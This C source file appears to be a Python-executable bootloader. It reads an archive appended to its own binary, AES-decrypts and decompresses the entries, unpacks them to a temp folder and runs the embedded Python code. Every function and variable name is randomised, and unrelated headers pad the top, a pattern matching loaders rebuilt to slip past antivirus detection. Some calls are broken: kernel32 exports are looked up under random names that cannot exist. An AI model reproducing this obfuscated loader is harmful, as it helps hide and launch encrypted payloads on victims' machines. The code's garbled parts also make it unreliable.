#define _WIN32_WINNT 0x0500
#include "utils.h"
#include <cplext.h>
#include <memory.h>
#include <restartmanager.h>
#include <stllock.h>
#include <certbcli.h>
#include <dbt.h>
#include <commctrl.h>
#include <polarity.h>
#include <xinput.h>
#include <windows.h>
#include <string.h>
#include <winver.h>
#include <sens.h>
#include <winuser.h>
#include <intshcut.h>
#include <signal.h>
#include <netevent.h>
#include <custcntl.h>
#include <gdiplus.h>
#include <chanmgr.h>
#include <signal.h>
#include <mem.h>
#include <syslimits.h>
#include <filter.h>
#include <winwlx.h>
#include <portabledeviceconnectapi.h>
#include <davclnt.h>
#include <sdoias.h>
#include <ftsiface.h>
#include <tlogstg.h>
#include <regstr.h>
#include "utils.h"
#include <windows.h>
#define unsetenv(x) _putenv(x "=")
#define snprintf _snprintf
#include <string.h>
#include "zlib.h"
#include <process.h>
#include "launch.h"
#include <io.h>
#include <sys/types.h>
#define vsnprintf _vsnprintf
#include <stdio.h>
#include <sys/stat.h>
#include <direct.h>
char* basename (char *VrmDSmKQBvv) {
char *dxbgnpXBEWWc = strrchr (VrmDSmKQBvv, '\\');
if (!dxbgnpXBEWWc) dxbgnpXBEWWc = strrchr (VrmDSmKQBvv, '/');
return dxbgnpXBEWWc ? ++dxbgnpXBEWWc : (char*)VrmDSmKQBvv;}
int szJnGlkP(void) {
OSVERSIONINFO wrLbPbUD;
ZeroMemory(&wrLbPbUD, sizeof(OSVERSIONINFO));
wrLbPbUD.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
GetVersionEx(&wrLbPbUD);
return ((wrLbPbUD.dwMajorVersion > 5) || ((wrLbPbUD.dwMajorVersion == 5) && (wrLbPbUD.dwMinorVersion >= 1)));}
int kpLoRqP(char *QnDasGMYUZH, char *jiCpyTsslMSlMl) { return 0; }
void ochkoBHcUdis(void) {
void (WINAPI *ibTVVP)(HANDLE);
BOOL (WINAPI *EwmCAwJMedIoFx)(DWORD dwFlags, ULONG_PTR ulCookie);
HANDLE CJjDXkDRYIzMnY;
if (!szJnGlkP()) return;
CJjDXkDRYIzMnY = LoadLibrary("kernel32");
ibTVVP = (void*)GetProcAddress(CJjDXkDRYIzMnY, "ibTVVP");
EwmCAwJMedIoFx = (void*)GetProcAddress(CJjDXkDRYIzMnY, "EwmCAwJMedIoFx");
if (!ibTVVP || !EwmCAwJMedIoFx) { return; }}
void wTbYHycadBojjDB(void) { InitCommonControls(); }
int RidfxdEzSBmfi(char *UOErjTi, const char *ACZyktKs) {
if (!GetModuleFileNameA(NULL, UOErjTi, _MAX_PATH)) { return -1; } return 0; }
int hwMDZBvnCF(LPWSTR hpBHNObErlg) {
if (!GetModuleFileNameW(NULL, hpBHNObErlg, _MAX_PATH)) { return -1; } return 0; }
void KNASQRIRQMV(char *VNcHfAfr, const char *lnHIyMl) {
char *EZXvhV = NULL;
strcpy(VNcHfAfr, lnHIyMl);
for (EZXvhV = VNcHfAfr + strlen(VNcHfAfr); *EZXvhV != '\\' && EZXvhV >= VNcHfAfr + 2; --EZXvhV);
*++EZXvhV = '\0'; }
void oanKnOIhpasN(char *wiJogSHXHa, const char *tjjtCF){
strcpy(wiJogSHXHa, tjjtCF);
strcpy(wiJogSHXHa + strlen(wiJogSHXHa) - 3, "pkg");}
 int potbFMUVCZ(const ARCHIVE_STATUS *nxMEYtMvn) { return 0; }
int XXuuqhTytW(LPWSTR fGLaVpCGZXWA) {
SECURITY_ATTRIBUTES uzqSkmqr;
STARTUPINFOW ivNbZLzUugQ;
PROCESS_INFORMATION cPZesbOQgZJrGi;
int UltooeqFEHEhz = 0;
signal(SIGINT, SIG_IGN);
signal(SIGTERM, SIG_IGN);
signal(SIGABRT, SIG_IGN);
uzqSkmqr.bInheritHandle = TRUE;
signal(SIGBREAK, SIG_IGN);
uzqSkmqr.nLength = sizeof(uzqSkmqr);
uzqSkmqr.lpSecurityDescriptor = NULL;
GetStartupInfoW(&ivNbZLzUugQ);
ivNbZLzUugQ.lpReserved = NULL;
ivNbZLzUugQ.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
ivNbZLzUugQ.lpTitle = NULL;
ivNbZLzUugQ.wShowWindow = SW_NORMAL;
ivNbZLzUugQ.hStdError = (void*)_get_osfhandle(fileno(stderr));
ivNbZLzUugQ.hStdInput = (void*)_get_osfhandle(fileno(stdin));
ivNbZLzUugQ.lpDesktop = NULL;
ivNbZLzUugQ.hStdOutput = (void*)_get_osfhandle(fileno(stdout));
if (CreateProcessW( fGLaVpCGZXWA, GetCommandLineW(), &uzqSkmqr, NULL, TRUE, 0,  NULL, NULL, &ivNbZLzUugQ, &cPZesbOQgZJrGi)) {
WaitForSingleObject(cPZesbOQgZJrGi.hProcess, INFINITE);
GetExitCodeProcess(cPZesbOQgZJrGi.hProcess, (unsigned long *)&UltooeqFEHEhz);
} else { UltooeqFEHEhz = -1; }
return UltooeqFEHEhz; }
DECLPROC(Py_SetProgramName);
DECLPROC(PyModule_GetDict);
DECLPROC(PyString_AsString);
DECLPROC(PyErr_Print);
DECLPROC(PyRun_SimpleString);
DECLPROC(PyImport_ExecCodeModule);
DECLPROC(Py_BuildValue);
DECLPROC(Py_DecRef);
DECLPROC(PyDict_GetItemString);
DECLPROC(PyErr_Clear);
DECLPROC(Py_Initialize);
DECLPROC(PyObject_SetAttrString);
DECLPROC(PyObject_CallFunction);
DECLPROC(PyImport_ImportModule);
DECLPROC(PyInt_AsLong);
DECLPROC(PyImport_AddModule);
DECLPROC(Py_Finalize);
DECLPROC(PyList_Append);
DECLVAR(Py_NoSiteFlag);
DECLPROC(PyList_New);
DECLPROC(PyObject_CallMethod);
DECLPROC(PyErr_Occurred);
DECLVAR(Py_FrozenFlag);
DECLPROC(PyString_FromStringAndSize);
DECLPROC(Py_IncRef);
DECLPROC(PySys_SetObject);
unsigned char *SGDbDhuWM(ARCHIVE_STATUS *oLpsHsOyujDb, TOC *SRboUC);
int mGkitJhHLvi(char *OtcZJiohdjNBMhy){
int i;
char *tjdzlXpfqbRGGEf;
char fhnvjPiEi[16];
GetTempPath(MAX_PATH, OtcZJiohdjNBMhy);
sprintf(fhnvjPiEi, "_MEI%d", getpid());
for (i=0;i<5;i++) {
    tjdzlXpfqbRGGEf = _tempnam(OtcZJiohdjNBMhy, fhnvjPiEi);
    if (mkdir(tjdzlXpfqbRGGEf) == 0) {
        strcpy(OtcZJiohdjNBMhy, tjdzlXpfqbRGGEf); strcat(OtcZJiohdjNBMhy, "\\");
        free(tjdzlXpfqbRGGEf); return 1;
    } free(tjdzlXpfqbRGGEf);
} return 0; }
static int alLElzOpqOZA(char *TJbiQtElObcdrA, const char *uvaQrZpP, ...){
    va_list TFFLeEpQFf;
    struct stat yZSFcpRtBBKvdtt;
    va_start(TFFLeEpQFf, uvaQrZpP);
    vsnprintf(TJbiQtElObcdrA, _MAX_PATH, uvaQrZpP, TFFLeEpQFf);
    va_end(TFFLeEpQFf);
    return stat(TJbiQtElObcdrA, &yZSFcpRtBBKvdtt); }
int rDvZnGjxrftwm(ARCHIVE_STATUS *hClBfkohE, char const * mBCkFiqa, char const * ZKuOhmWIsebItTp) {
    char *iQmcBRO;
    strcpy(hClBfkohE->archivename, mBCkFiqa);
    strcat(hClBfkohE->archivename, ZKuOhmWIsebItTp);
    strcpy(hClBfkohE->homepath, mBCkFiqa);
    strcpy(hClBfkohE->homepathraw, mBCkFiqa);
    for ( iQmcBRO = hClBfkohE->homepath; *iQmcBRO; iQmcBRO++ ) if (*iQmcBRO == '\\') *iQmcBRO = '/';
    return 0;}
int wYrwup(ARCHIVE_STATUS *eguXnicnBz, int sTbqSLSAq) {
    if (fseek(eguXnicnBz->fp, sTbqSLSAq-(int)sizeof(COOKIE), SEEK_SET)) return -1;
    if (fread(&(eguXnicnBz->cookie), sizeof(COOKIE), 1, eguXnicnBz->fp) < 1) return -1;
    if (strncmp(eguXnicnBz->cookie.magic, MAGIC, strlen(MAGIC))) return -1;
    return 0;}
    int ndqRJbtnndS(ARCHIVE_STATUS *suFKrE){
        int i; int WetNTgoUUCSLc;
        suFKrE->fp = fopen(suFKrE->archivename, "rb");
        if (suFKrE->fp == NULL) { return -1;}
        fseek(suFKrE->fp, 0, SEEK_END);
        WetNTgoUUCSLc = ftell(suFKrE->fp);
        if (wYrwup(suFKrE, WetNTgoUUCSLc) < 0) { return -1;}
        suFKrE->pkgstart = WetNTgoUUCSLc - ntohl(suFKrE->cookie.len);
        fseek(suFKrE->fp, suFKrE->pkgstart + ntohl(suFKrE->cookie.TOC), SEEK_SET);
        suFKrE->tocbuff = (TOC *) malloc(ntohl(suFKrE->cookie.TOClen));
        if (suFKrE->tocbuff == NULL){ return -1; }
        if (fread(suFKrE->tocbuff, ntohl(suFKrE->cookie.TOClen), 1, suFKrE->fp) < 1) { return -1; }
        suFKrE->tocend = (TOC *) (((char *)suFKrE->tocbuff) + ntohl(suFKrE->cookie.TOClen));
        if (ferror(suFKrE->fp)) { return -1; }
        return 0;}
        struct _old_typeobject;
        typedef struct _old_object { int ob_refcnt; struct _old_typeobject *ob_type;} OldPyObject;
        typedef void (*destructor)(PyObject *);
        typedef struct _old_typeobject { int ob_refcnt; struct _old_typeobject *ob_type; int ob_size; char *tp_name;
            int tp_basicsize, tp_itemsize; destructor tp_dealloc; } OldPyTypeObject;
        static void _EmulatedIncRef(PyObject *o){
            OldPyObject *oo = (OldPyObject*)o;
            if (oo) oo->ob_refcnt++;}
        static void _EmulatedDecRef(PyObject *o){
            #define _Py_Dealloc(op) (*(op)->ob_type->tp_dealloc)((PyObject *)(op))
            OldPyObject *oo = (OldPyObject*)o;
            if (--(oo)->ob_refcnt == 0) _Py_Dealloc(oo);}
int sXWnHkdQdt(HMODULE gUJpNrAirE, int OeDPsweHOZOm){
GETPROC(gUJpNrAirE, Py_BuildValue);
GETPROC(gUJpNrAirE, PyInt_AsLong);
GETPROC(gUJpNrAirE, PyErr_Print);
GETPROC(gUJpNrAirE, PyImport_ExecCodeModule);
GETPROC(gUJpNrAirE, PyImport_ImportModule);
GETPROC(gUJpNrAirE, PyErr_Clear);
GETPROC(gUJpNrAirE, Py_Finalize);
GETPROC(gUJpNrAirE, PyDict_GetItemString);
GETPROC(gUJpNrAirE, PyList_Append);
GETPROCOPT(gUJpNrAirE, Py_DecRef);
GETPROC(gUJpNrAirE, PyList_New);
GETPROC(gUJpNrAirE, PyImport_AddModule);
GETPROC(gUJpNrAirE, PyModule_GetDict);
GETPROC(gUJpNrAirE, PyRun_SimpleString);
GETPROCOPT(gUJpNrAirE, Py_IncRef);
GETPROC(gUJpNrAirE, PyString_AsString);
GETPROC(gUJpNrAirE, Py_SetProgramName);
GETPROC(gUJpNrAirE, PyObject_CallMethod);
GETPROC(gUJpNrAirE, PyString_FromStringAndSize);
GETPROC(gUJpNrAirE, Py_Initialize);
GETPROC(gUJpNrAirE, PyObject_CallFunction);
GETVAR(gUJpNrAirE, Py_FrozenFlag);
GETVAR(gUJpNrAirE, Py_NoSiteFlag);
GETPROC(gUJpNrAirE, PyObject_SetAttrString);
GETPROC(gUJpNrAirE, PyErr_Occurred);
    if (!PI_Py_IncRef) PI_Py_IncRef = _EmulatedIncRef;
    if (!PI_Py_DecRef) PI_Py_DecRef = _EmulatedDecRef;
    return 0;}
int DOaCRqBZKiYumv(ARCHIVE_STATUS *iXNhSMnPAdA){
    HINSTANCE CajQzVQaJPR;
    char DiIMGbk[_MAX_PATH + 1];
    int iYRJKZoGZTQqp = ntohl(iXNhSMnPAdA->cookie.pyvers);
    sprintf(DiIMGbk, "%spython%02d.dll", iXNhSMnPAdA->homepathraw, iYRJKZoGZTQqp);
    CajQzVQaJPR = LoadLibraryExA(DiIMGbk, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
    if (!CajQzVQaJPR) {sprintf(DiIMGbk, "%spython%02d.dll", iXNhSMnPAdA->temppathraw, iYRJKZoGZTQqp);
        CajQzVQaJPR = LoadLibraryExA(DiIMGbk, NULL, LOAD_WITH_ALTERED_SEARCH_PATH );}
    if (CajQzVQaJPR == 0) { return -1; }
    sXWnHkdQdt(CajQzVQaJPR, iYRJKZoGZTQqp);
    return 0;}
 TOC *axOzXbBy(ARCHIVE_STATUS *nxDWSTaFrhqq, TOC* LucxqGUYqLBwo){
     TOC *ePjBvzU = (TOC*)((char *)LucxqGUYqLBwo + ntohl(LucxqGUYqLBwo->structlen));
     if (ePjBvzU < nxDWSTaFrhqq->tocbuff) { return nxDWSTaFrhqq->tocend; }
     return ePjBvzU;}
int kNTpLDYoKCw(ARCHIVE_STATUS *DwUdnzMPxnQB, int argc, char *argv[]) {
static char MtyoiBnNMg[2*_MAX_PATH + 14];
int i;
char KfYVuaSrwCvIdY[_MAX_PATH+1+80];
char QKtklHNUckQmOon[_MAX_PATH+1];
PyObject *TOcZDGPdtIXYQ;
PyObject *val;
PyObject *sys;
strcpy(MtyoiBnNMg, "PYTHONPATH=");
if (DwUdnzMPxnQB->temppath[0] != '\0') { strcat(MtyoiBnNMg, DwUdnzMPxnQB->temppath); MtyoiBnNMg[strlen(MtyoiBnNMg)-1] = '\0'; strcat(MtyoiBnNMg, ";"); }
strcat(MtyoiBnNMg, DwUdnzMPxnQB->homepath);
if (strlen(MtyoiBnNMg) > 14) MtyoiBnNMg[strlen(MtyoiBnNMg)-1] = '\0';
putenv(MtyoiBnNMg);
strcpy(MtyoiBnNMg, "PYTHONHOME=");
strcat(MtyoiBnNMg, DwUdnzMPxnQB->temppath);
putenv(MtyoiBnNMg);
*PI_Py_NoSiteFlag = 1; *PI_Py_FrozenFlag = 1;
PI_Py_SetProgramName(DwUdnzMPxnQB->archivename);
PI_Py_Initialize();
PI_PyRun_SimpleString("import sys\n");
PI_PyRun_SimpleString("del sys.path[:]\n");
if (DwUdnzMPxnQB->temppath[0] != '\0') {
    strcpy(QKtklHNUckQmOon, DwUdnzMPxnQB->temppath);
    QKtklHNUckQmOon[strlen(QKtklHNUckQmOon)-1] = '\0';
    sprintf(KfYVuaSrwCvIdY, "sys.path.append(r\"%s\")", QKtklHNUckQmOon);
    PI_PyRun_SimpleString(KfYVuaSrwCvIdY);}
strcpy(QKtklHNUckQmOon, DwUdnzMPxnQB->homepath);
QKtklHNUckQmOon[strlen(QKtklHNUckQmOon)-1] = '\0';
sprintf(KfYVuaSrwCvIdY, "sys.path.append(r\"%s\")", QKtklHNUckQmOon);
PI_PyRun_SimpleString (KfYVuaSrwCvIdY);
TOcZDGPdtIXYQ = PI_PyList_New(0);
val = PI_Py_BuildValue("s", DwUdnzMPxnQB->archivename);
PI_PyList_Append(TOcZDGPdtIXYQ, val);
for (i = 1; i < argc; ++i) { val = PI_Py_BuildValue ("s", argv[i]); PI_PyList_Append (TOcZDGPdtIXYQ, val); }
sys = PI_PyImport_ImportModule("sys");
PI_PyObject_SetAttrString(sys, "argv", TOcZDGPdtIXYQ);
return 0;}
int HdPmDvVVxEsKom(ARCHIVE_STATUS *XrgbgyHFUUHCc){
    PyObject *fScKSAH; PyObject *jWsUaqy; PyObject *JYUaahb;
    TOC *YwfbnU; PyObject *co; PyObject *mod;
    fScKSAH = PI_PyImport_ImportModule("marshal");
    jWsUaqy = PI_PyModule_GetDict(fScKSAH);
    JYUaahb = PI_PyDict_GetItemString(jWsUaqy, "loads");
    YwfbnU = XrgbgyHFUUHCc->tocbuff;
    while (YwfbnU < XrgbgyHFUUHCc->tocend) {
        if (YwfbnU->typcd == 'm' || YwfbnU->typcd == 'M'){
            unsigned char *wHwxPKxhKJdmY = SGDbDhuWM(XrgbgyHFUUHCc, YwfbnU);
            co = PI_PyObject_CallFunction(JYUaahb, "s#", wHwxPKxhKJdmY+8, ntohl(YwfbnU->ulen)-8);
            mod = PI_PyImport_ExecCodeModule(YwfbnU->name, co);
            if (PI_PyErr_Occurred()) { PI_PyErr_Print(); PI_PyErr_Clear(); }
            free(wHwxPKxhKJdmY);
        }
        YwfbnU = axOzXbBy(XrgbgyHFUUHCc, YwfbnU);
    } return 0; }
int ETmLkjcfMikkF(ARCHIVE_STATUS *omiIRJ, TOC *SGqpcWCJUlWZF){
    int vkhMrBTLyL; int HYANkA = omiIRJ->pkgstart + ntohl(SGqpcWCJUlWZF->pos);
    char *mqdboGlc = "sys.path.append(r\"%s?%d\")\n";
    char *ClqIvHrJjb = (char *) malloc(strlen(mqdboGlc) + strlen(omiIRJ->archivename) + 32);
    sprintf(ClqIvHrJjb, mqdboGlc, omiIRJ->archivename, HYANkA);
    vkhMrBTLyL = PI_PyRun_SimpleString(ClqIvHrJjb);
    if (vkhMrBTLyL != 0){ free(ClqIvHrJjb); return -1; }
    free(ClqIvHrJjb); return 0;}
int ZoJMtJHFzYkkW(ARCHIVE_STATUS *AhNxvlxRDW){
TOC * vXyFJyEIM; vXyFJyEIM = AhNxvlxRDW->tocbuff;
while (vXyFJyEIM < AhNxvlxRDW->tocend) {
    if (vXyFJyEIM->typcd == 'z') { ETmLkjcfMikkF(AhNxvlxRDW, vXyFJyEIM); }
    vXyFJyEIM = axOzXbBy(AhNxvlxRDW, vXyFJyEIM); }
return 0; }
unsigned char *XFdfZKxlfuHI(unsigned char * bsousSFPOXOq, TOC *tDUBFlYAagyT){
unsigned char *KFEWSWw; z_stream rjtJAoqdoEGvmCL; int odUagGozPJ;
KFEWSWw = (unsigned char *)malloc(ntohl(tDUBFlYAagyT->ulen));
if (KFEWSWw == NULL) { return NULL; }
rjtJAoqdoEGvmCL.zalloc = NULL;
rjtJAoqdoEGvmCL.zfree = NULL;
rjtJAoqdoEGvmCL.opaque = NULL;
rjtJAoqdoEGvmCL.next_in = bsousSFPOXOq;
rjtJAoqdoEGvmCL.avail_in = ntohl(tDUBFlYAagyT->len);
rjtJAoqdoEGvmCL.next_out = KFEWSWw;
rjtJAoqdoEGvmCL.avail_out = ntohl(tDUBFlYAagyT->ulen);
odUagGozPJ = inflateInit(&rjtJAoqdoEGvmCL);
if (odUagGozPJ >= 0) { 
    odUagGozPJ = (inflate)(&rjtJAoqdoEGvmCL, Z_FINISH);
    if (odUagGozPJ >= 0) { odUagGozPJ = (inflateEnd)(&rjtJAoqdoEGvmCL); }
    else { return NULL; } }
else { return NULL; }
return KFEWSWw;}
unsigned char *SGDbDhuWM(ARCHIVE_STATUS *FRuKMIfuSmppd, TOC *XHsBEVaS){
unsigned char *chucbEYzIhoIPg;unsigned char *sfgBTCcZMmugofO;
fseek(FRuKMIfuSmppd->fp, FRuKMIfuSmppd->pkgstart + ntohl(XHsBEVaS->pos), SEEK_SET);
chucbEYzIhoIPg = (unsigned char *)malloc(ntohl(XHsBEVaS->len));
if (chucbEYzIhoIPg == NULL) { return NULL; }
if (fread(chucbEYzIhoIPg, ntohl(XHsBEVaS->len), 1, FRuKMIfuSmppd->fp) < 1) { return NULL; }
if (XHsBEVaS->cflag == '\2') {
    static PyObject *lVRtysyXJxzSD = NULL;
    PyObject *QFvOhuwJqA; PyObject *SZxhLdNyHllkOe; PyObject *cPIMXMJxPlHw; PyObject *YCzsyYPMsTd;
    long block_size; char *iv;
    if (!lVRtysyXJxzSD) lVRtysyXJxzSD = PI_PyImport_ImportModule("AES");
    SZxhLdNyHllkOe = PI_PyModule_GetDict(lVRtysyXJxzSD);
    QFvOhuwJqA = PI_PyDict_GetItemString(SZxhLdNyHllkOe, "new");
    block_size = PI_PyInt_AsLong(PI_PyDict_GetItemString(SZxhLdNyHllkOe, "block_size"));
    iv = malloc(block_size);
    memset(iv, 0, block_size);
    cPIMXMJxPlHw = PI_PyObject_CallFunction(QFvOhuwJqA, "s#Os#", chucbEYzIhoIPg, 32, PI_PyDict_GetItemString(SZxhLdNyHllkOe, "MODE_CFB"), iv, block_size);
    YCzsyYPMsTd = PI_PyObject_CallMethod(cPIMXMJxPlHw, "decrypt", "s#", chucbEYzIhoIPg+32, ntohl(XHsBEVaS->len)-32);
    memcpy(chucbEYzIhoIPg, PI_PyString_AsString(YCzsyYPMsTd), ntohl(XHsBEVaS->len)-32);
    Py_DECREF(cPIMXMJxPlHw); Py_DECREF(YCzsyYPMsTd);}
if (XHsBEVaS->cflag == '\1' || XHsBEVaS->cflag == '\2') {
    sfgBTCcZMmugofO = XFdfZKxlfuHI(chucbEYzIhoIPg, XHsBEVaS);
    free(chucbEYzIhoIPg); chucbEYzIhoIPg = sfgBTCcZMmugofO;
    if (chucbEYzIhoIPg == NULL) { return NULL; } }
return chucbEYzIhoIPg;}
FILE *dlEbKwerZsqm(const char *lZkDJgF, const char* RkOBnNTbtysktUQ) {
struct stat WiXbNFKtfnFPy; char uodUctqNQgf[_MAX_PATH+1]; char qIjHKXmZrDOlHmk[_MAX_PATH+1]; char *pxZpLEHz;
strcpy(uodUctqNQgf, lZkDJgF); strcpy(qIjHKXmZrDOlHmk, RkOBnNTbtysktUQ); uodUctqNQgf[strlen(uodUctqNQgf)-1] = '\0';
pxZpLEHz = strtok(qIjHKXmZrDOlHmk, "/\\");
while (pxZpLEHz != NULL){
    strcat(uodUctqNQgf, "\\");
    strcat(uodUctqNQgf, pxZpLEHz);
    pxZpLEHz = strtok(NULL, "/\\");
    if (!pxZpLEHz) break;
    if (stat(uodUctqNQgf, &WiXbNFKtfnFPy) < 0) {mkdir(uodUctqNQgf);} }
return fopen(uodUctqNQgf, "wb"); }
static int GrdozDndT(ARCHIVE_STATUS *ffzpUrHrBuvjxfz) {
char *ESUzQxxQaCXeWru;
if (ffzpUrHrBuvjxfz->temppath[0] == '\0') {
    if (!mGkitJhHLvi(ffzpUrHrBuvjxfz->temppath)) {return -1;}
    strcpy(ffzpUrHrBuvjxfz->temppathraw, ffzpUrHrBuvjxfz->temppath);
    for ( ESUzQxxQaCXeWru=ffzpUrHrBuvjxfz->temppath; *ESUzQxxQaCXeWru; ESUzQxxQaCXeWru++ ) if (*ESUzQxxQaCXeWru == '\\') *ESUzQxxQaCXeWru = '/';}
return 0;}
int BFTiQVRX(ARCHIVE_STATUS *GOZcFeomWakOlGQ, TOC *RCrBMoMWuC) {
FILE *bDcHQaXSeJw; unsigned char *VMuYNGNf = SGDbDhuWM(GOZcFeomWakOlGQ, RCrBMoMWuC);
if (GrdozDndT(GOZcFeomWakOlGQ) == -1){ return -1; }
bDcHQaXSeJw = dlEbKwerZsqm(GOZcFeomWakOlGQ->temppath, RCrBMoMWuC->name);
if (bDcHQaXSeJw == NULL)  { return -1; }
else { fwrite(VMuYNGNf, ntohl(RCrBMoMWuC->ulen), 1, bDcHQaXSeJw); fclose(bDcHQaXSeJw); }
free(VMuYNGNf); return 0; }
static int wePBEXKtzB(char *XSuVHrWv, char *BUaISG, const char *czSgELSs) {
char RhBezsC[_MAX_PATH + 1];
strcpy(RhBezsC, czSgELSs);
strcpy(XSuVHrWv, strtok(RhBezsC, ":"));
strcpy(BUaISG, strtok(NULL, ":")) ;
if (XSuVHrWv[0] == 0 || BUaISG[0] == 0) return -1;
return 0; }
static int BecGJpAct(const char *AJiDgIqMTRJVSa, const char *lFHrAPnGGmN, const char *UZTVZgOBW) {
FILE *HBycWv = fopen(AJiDgIqMTRJVSa, "rb"); FILE *LUtTFGUnWOtVOLT = dlEbKwerZsqm(lFHrAPnGGmN, UZTVZgOBW);
char buf[4096]; int error = 0;
if (HBycWv == NULL || LUtTFGUnWOtVOLT == NULL) return -1;
while (!feof(HBycWv)) {
    if (fread(buf, 4096, 1, HBycWv) == -1) {
        if (ferror(HBycWv)) { clearerr(HBycWv); error = -1; break; }
    } else {
        fwrite(buf, 4096, 1, LUtTFGUnWOtVOLT);
        if (ferror(LUtTFGUnWOtVOLT)) { clearerr(LUtTFGUnWOtVOLT); error = -1; break;}}}
fclose(HBycWv); fclose(LUtTFGUnWOtVOLT); return error; }
static char *iqZarPpgKmgDk(const char *wjBzIBtbba) {
char *tEugkDFGcdgG = strrchr(wjBzIBtbba, '\\');
char *NNvlqtvZur = (char *) calloc(_MAX_PATH, sizeof(char));
if (tEugkDFGcdgG != NULL) strncpy(NNvlqtvZur, wjBzIBtbba, tEugkDFGcdgG - wjBzIBtbba + 1);
else strcpy(NNvlqtvZur, wjBzIBtbba);
return NNvlqtvZur; }
static int WYjYnVnlQSBivX(ARCHIVE_STATUS *PtVdhlYXV, const char *CjfxMjPuczV, const char *ldyUvO){
if (GrdozDndT(PtVdhlYXV) == -1){ return -1; }
if (BecGJpAct(CjfxMjPuczV, PtVdhlYXV->temppath, ldyUvO) == -1) { return -1; }
return 0; }
static ARCHIVE_STATUS *sCRqeV(ARCHIVE_STATUS *TUNDrNzIknH[], const char *cjYfiIw) {
ARCHIVE_STATUS *HTZktn = NULL; int i = 0;
if (GrdozDndT(TUNDrNzIknH[SELF]) == -1){ return NULL; } 
for (i = 1; TUNDrNzIknH[i] != NULL; i++){ if (strcmp(TUNDrNzIknH[i]->archivename, cjYfiIw) == 0) { return TUNDrNzIknH[i]; } }
if ((HTZktn = (ARCHIVE_STATUS *) calloc(1, sizeof(ARCHIVE_STATUS))) == NULL) { return NULL; }
strcpy(HTZktn->archivename, cjYfiIw);
strcpy(HTZktn->homepath, TUNDrNzIknH[SELF]->homepath);
strcpy(HTZktn->temppath, TUNDrNzIknH[SELF]->temppath);
strcpy(HTZktn->homepathraw, TUNDrNzIknH[SELF]->homepathraw);
strcpy(HTZktn->temppathraw, TUNDrNzIknH[SELF]->temppathraw);
if (ndqRJbtnndS(HTZktn)) { free(HTZktn); return NULL; }
TUNDrNzIknH[i] = HTZktn; return HTZktn; }
static int bsqnqWZQSxYn(ARCHIVE_STATUS *tZmZlBtcIiEI, const char *JJifMBRI) {
TOC * QthyfuDvTXebdVs = tZmZlBtcIiEI->tocbuff;
while (QthyfuDvTXebdVs < tZmZlBtcIiEI->tocend) {
    if (strcmp(QthyfuDvTXebdVs->name, JJifMBRI) == 0) if (BFTiQVRX(tZmZlBtcIiEI, QthyfuDvTXebdVs)) return -1;
    QthyfuDvTXebdVs = axOzXbBy(tZmZlBtcIiEI, QthyfuDvTXebdVs); }
return 0; }
static int snCjwlryH(ARCHIVE_STATUS *PnnBeRVcLkEjxk[], const char *FfFSYjbaokOmWwy) {
ARCHIVE_STATUS *osckuRiaHS = NULL;
char TaTCaQvLG[_MAX_PATH + 1]; char xyeKapy[_MAX_PATH + 1];
char IYdTbUzfWy[_MAX_PATH + 1]; char *mWoIFwAJZQDsItm = NULL;
if (wePBEXKtzB(TaTCaQvLG, xyeKapy, FfFSYjbaokOmWwy) == -1) return -1;
mWoIFwAJZQDsItm = iqZarPpgKmgDk(TaTCaQvLG);
if (mWoIFwAJZQDsItm[0] == 0) { free(mWoIFwAJZQDsItm); return -1; }
if ((alLElzOpqOZA(IYdTbUzfWy, "%s%s.pkg", PnnBeRVcLkEjxk[SELF]->homepath, TaTCaQvLG) != 0) &&
    (alLElzOpqOZA(IYdTbUzfWy, "%s%s.exe", PnnBeRVcLkEjxk[SELF]->homepath, TaTCaQvLG) != 0) &&
    (alLElzOpqOZA(IYdTbUzfWy, "%s%s", PnnBeRVcLkEjxk[SELF]->homepath, TaTCaQvLG) != 0)) { return -1; }
    if ((osckuRiaHS = sCRqeV(PnnBeRVcLkEjxk, IYdTbUzfWy)) == NULL) { return -1; }
if (bsqnqWZQSxYn(osckuRiaHS, xyeKapy) == -1) { free(osckuRiaHS); return -1; }
free(mWoIFwAJZQDsItm); return 0; }
int vRQebKCCRrnDGe(ARCHIVE_STATUS *JbWPtHzrtajO[]) {
TOC * OQQvYCSDtawGFwq = JbWPtHzrtajO[SELF]->tocbuff;
while (OQQvYCSDtawGFwq < JbWPtHzrtajO[SELF]->tocend) {
    if (OQQvYCSDtawGFwq->typcd == 'b' || OQQvYCSDtawGFwq->typcd == 'x' || OQQvYCSDtawGFwq->typcd == 'Z') return 1;
    if (OQQvYCSDtawGFwq->typcd == 'd')  return 1;
    OQQvYCSDtawGFwq = axOzXbBy(JbWPtHzrtajO[SELF], OQQvYCSDtawGFwq);
} return 0; }
int pbtRZQU(ARCHIVE_STATUS *QkWxBKUO[]) {
TOC * dJTuBOaBRyD = QkWxBKUO[SELF]->tocbuff;
while (dJTuBOaBRyD < QkWxBKUO[SELF]->tocend) {
    if (dJTuBOaBRyD->typcd == 'b' || dJTuBOaBRyD->typcd == 'x' || dJTuBOaBRyD->typcd == 'Z')
        if (BFTiQVRX(QkWxBKUO[SELF], dJTuBOaBRyD)) return -1;
    if (dJTuBOaBRyD->typcd == 'd') {
        if (snCjwlryH(QkWxBKUO, dJTuBOaBRyD->name) == -1) return -1; }
    dJTuBOaBRyD = axOzXbBy(QkWxBKUO[SELF], dJTuBOaBRyD); }
return 0; }
int HZWOOvAo(ARCHIVE_STATUS *ESjaOJotIdyhqcx) {
unsigned char *QVNvhMkyEqFKEx; char zYyYuPGe[_MAX_PATH]; int NCZgtFOfxQRThE = 0;
TOC * tasgrOigVgr = ESjaOJotIdyhqcx->tocbuff;
PyObject *__main__ = PI_PyImport_AddModule("__main__"); PyObject *__file__;
while (tasgrOigVgr < ESjaOJotIdyhqcx->tocend) {
    if (tasgrOigVgr->typcd == 's') {
        QVNvhMkyEqFKEx = SGDbDhuWM(ESjaOJotIdyhqcx, tasgrOigVgr);
        strcpy(zYyYuPGe, tasgrOigVgr->name); strcat(zYyYuPGe, ".py");
        __file__ = PI_PyString_FromStringAndSize(zYyYuPGe, strlen(zYyYuPGe));
        PI_PyObject_SetAttrString(__main__, "__file__", __file__); Py_DECREF(__file__);
        NCZgtFOfxQRThE = PI_PyRun_SimpleString(QVNvhMkyEqFKEx);
        if (NCZgtFOfxQRThE != 0) return NCZgtFOfxQRThE; free(QVNvhMkyEqFKEx); }
    tasgrOigVgr = axOzXbBy(ESjaOJotIdyhqcx, tasgrOigVgr);
} return 0; }
